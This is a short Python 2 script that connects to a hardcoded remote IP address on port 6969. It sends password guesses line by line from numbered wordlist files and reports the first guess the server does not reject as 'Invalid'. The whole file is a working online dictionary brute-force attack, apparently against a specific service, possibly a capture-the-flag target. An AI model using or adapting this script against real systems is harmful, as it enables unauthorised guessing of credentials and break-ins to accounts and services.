#!/usr/bin/env python
from struct import *
import sys
import socket

argvs   = sys.argv
rhp     = ("88.87.208.163", 6969)
alpha = "abcdefghijklmnopqrstuvwxyz"

#==============================

nc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
nc.settimeout(5.0)
nc.connect(rhp)

pass_file=[]
for i in range(int(argvs[1]) if len(argvs)>1 else 4):
        pass_file += ["password.%c%c" % (alpha[i/26],alpha[i%26])]

#==============================
        
for files in pass_file:
        print "open: "+files
        f = open(files,"r")
        for line in f:
                nc.sendall(line)
                rsp=""
                while len(rsp[:-1])==0:
                        rsp=nc.recv(256)
                if("Invalid" not in rsp):
                        print rsp+": "+line[:-1]
                        f.close()
                        break
        f.close()

#==============================

nc.close()
